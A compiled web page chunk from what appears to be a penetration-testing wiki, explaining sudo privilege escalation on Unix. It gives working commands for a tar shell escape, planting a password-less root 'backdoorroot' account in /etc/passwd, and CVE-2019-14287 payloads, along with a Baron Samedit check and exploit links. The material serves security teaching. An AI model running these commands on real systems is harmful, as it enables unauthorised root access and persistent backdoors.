import{_ as e,c as i,a5 as a,o as t}from"./chunks/framework.B5CpDqM0.js";const n="/assets/sudoers_config.GsdsfJDF.png",k=JSON.parse('{"title":"SUDO","description":"","frontmatter":{"authors":"ShutdownRepo, dreamkinn, p0dalirius"},"headers":[],"relativePath":"infra/privilege-escalation/unix/sudo.md","filePath":"infra/privilege-escalation/unix/sudo.md","lastUpdated":1724982529000}'),o={name:"infra/privilege-escalation/unix/sudo.md"};function h(r,s,l,d,p,c){return t(),i("div",null,s[0]||(s[0]=[a('<h1 id="sudo" tabindex="-1">SUDO <a class="header-anchor" href="#sudo" aria-label="Permalink to &quot;SUDO&quot;">â€‹</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">â€‹</a></h2><p><code>sudo</code> (Super User DO) is a program for UNIX-like computer operating systems that allows users to run programs with the security privileges of another user (by default, the superuser).</p><p>Unlike the similar command <code>su</code>, users must, by default, supply their own password for authentication, rather than the password of the target user. After authentication, and if the configuration file, which is typically located at <code>/etc/sudoers</code>, permits the user access, the system invokes the requested command with the target user&#39;s privileges.</p><p>Sudo users are called sudoers ( ðŸ˜¯ <em>I know right, big brains here</em> ðŸ§  ). What sudoers are allowed to do is defined in the <code>/etc/sudoers</code> configuration file. This file, owned by <code>root</code>, is supposed to be 440 (read-only) and should only be edited with <code>visudo</code>, <code>sudoedit</code> or <code>sudo -e</code>.</p><p><img src="'+n+`" alt=""></p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">â€‹</a></h2><p>There are many ways to escalate privileges by exploiting <code>sudo</code>, either by profiting from insecure configuration, or by exploiting the program&#39;s vulnerabilities.</p><h3 id="default-configurations" tabindex="-1">Default configurations <a class="header-anchor" href="#default-configurations" aria-label="Permalink to &quot;Default configurations&quot;">â€‹</a></h3><p>The <code>sudo -l</code> command can be run by sudoers to check their sudo rights. The output reflects the <code>/etc/sudoers</code> configuration that applies to the user. It should like the following (default config for a new sudoer).</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Format is</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">User</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> johnthesudoer</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> may</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> run</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> the</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> following</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> commands</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> johncomputer:</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ALL</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> :</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ALL</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ALL</span></span></code></pre></div><p>For instance, this configuration allows the <code>johnthesudoer</code> user to run any privileged command as long as <code>johnthesudoer</code>&#39;s password is known. A privileged session can be obtained with <code>sudo -i</code>, <code>sudo -s</code>, <code>sudo su</code> or <code>sudo </code>.</p><h3 id="living-off-the-land" tabindex="-1">Living off the land <a class="header-anchor" href="#living-off-the-land" aria-label="Permalink to &quot;Living off the land&quot;">â€‹</a></h3><p>While the SUDO configuration can be hardened to restrict privileged execution to specific program, there are some that can be abused to bypass local security restrictions. This is called <a href="./living-off-the-land">Living off the land</a>.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">User</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> johnthesudoer</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> may</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> run</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> the</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> following</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> commands</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> johncomputer:</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ALL</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> :</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ALL</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">/bin/tar</span></span></code></pre></div><p>The configuration above only allows sudoer <code>johnthesudoer</code> to execute <code>/bin/tar</code> as root as long as <code>johnthesudoer</code>&#39;s password is known. The thing is tar is program that can be used to obtain a full session, hence bypassing the restrictions induced by sudoers configuration.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /bin/tar</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -cf</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /dev/null</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /dev/null</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --checkpoint=1</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --checkpoint-action=exec=/bin/sh</span></span></code></pre></div><p>Other examples can be found on the <a href="./living-off-the-land">Living off the land</a> note.</p><p>While some programs can be used to obtain a full shell, others can be used to induce changes on the system to grant root privileges, like <code>/usr/bin/cp</code>. The following commands are used to edit the <code>/etc/passwd</code> file to add a password-less user with <code>root</code>&#39;s uid and gid.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">cp</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/passwd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/passwd.bak</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;backdoorroot::0:0:Backdoor root:/root:/bin/bash&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &gt;&gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/passwd.bak</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /usr/bin/cp</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> passwd.bak</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/passwd</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">su</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -l</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> backdoorroot</span></span></code></pre></div><h3 id="cve-2019-14287-1" tabindex="-1">CVE-2019-14287 (#-1) <a class="header-anchor" href="#cve-2019-14287-1" aria-label="Permalink to &quot;CVE-2019-14287 (#-1)&quot;">â€‹</a></h3><p>With SUDO running version &lt; 1.8.28, an attacker in control of a &quot;runas ALL&quot; sudoer account can bypass certain policy blacklists and session PAM modules by invoking sudo with a crafted user ID.</p><p>Exploiting the bug requires sudo privileges and being able to run commands with an arbitrary user ID. This means the user&#39;s sudoers entry has to have the special value <code>ALL</code> in the &quot;runas&quot; specifier (the yellow and green parts in <a href="./sudo#theory">the doodle above</a>).</p><p>Vulnerable users can be found with the two commands below</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">grep</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -e</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;(\\s*ALL\\s*,\\s*!root\\s*)&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/sudoers</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">grep</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -e</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;(\\s*ALL\\s*,\\s*\\!#0\\s*)&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/sudoers</span></span></code></pre></div><p>The vulnerability can be exploited with one of the following payloads</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">#-1 sh -p</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">#4294967295 sh -p</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">#$((</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">0xffffffff</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)) sh -p</span></span></code></pre></div><div class="tip custom-block"><p>Some technical details to the vulnerability</p><p>Sudo uses the <code>setresuid(2)</code> and <code>setreuid(2)</code> system calls to change the user ID before running the command. So if you try to enter a negative user id <code>-1</code> (or its 32-bit unsigned equivalent <code>4294967295</code>), <code>setresuid(2)</code> and <code>setreuid(2)</code> cannot set a negative user id and you&#39;re left with the user id sudo is running with : <code>0</code>.</p><p>Therefore <code>sudo -u#-1 id -u</code> or <code>sudo -u#4294967295 id -u</code> will actually return <code>uid=0</code> and run command as root.</p><p>More info can be found <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14287" target="_blank" rel="noreferrer">here</a></p></div><h3 id="cve-2021-3156-baron-samedit" tabindex="-1">CVE-2021-3156 (Baron Samedit) <a class="header-anchor" href="#cve-2021-3156-baron-samedit" aria-label="Permalink to &quot;CVE-2021-3156 (Baron Samedit)&quot;">â€‹</a></h3><p>With SUDO running version &lt; 1.9.5p2, a Heap-based Buffer Overflow allows for privilege escalation to root via <code>sudoedit -s</code> and a command-line argument that ends with a single backslash character. To test if a system is vulnerable or not, the following command can be run as a non-root user.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudoedit</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -s</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /</span></span></code></pre></div><p>Patched versions will throw a <code>usage:</code> help message while vulnerable ones will throw the following <code>sudoedit:</code> error.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>$ sudoedit -s /</span></span>
<span class="line"><span>[sudo] password for user: </span></span>
<span class="line"><span>sudoedit: /: not a regular file</span></span></code></pre></div><p>This vulnerability can be exploited with <a href="https://github.com/r4j0x00/exploits/tree/master/CVE-2021-3156_one_shot" target="_blank" rel="noreferrer">this exploit</a>, or <a href="https://github.com/worawit/CVE-2021-3156" target="_blank" rel="noreferrer">this one</a>.</p><p>More info about this vulnerability can be found <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3156" target="_blank" rel="noreferrer">here</a> and <a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit" target="_blank" rel="noreferrer">here</a>.</p><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">â€‹</a></h2><p><a href="https://gtfobins.github.io/#+sudo" target="_blank" rel="noreferrer">https://gtfobins.github.io/#+sudo</a></p><p><a href="https://jamesluo-843.medium.com/exploiting-cve-2019-14287-37eac7023a4" target="_blank" rel="noreferrer">https://jamesluo-843.medium.com/exploiting-cve-2019-14287-37eac7023a4</a></p><p><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit" target="_blank" rel="noreferrer">https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></p>`,39)]))}const g=e(o,[["render",h]]);export{k as __pageData,g as default};
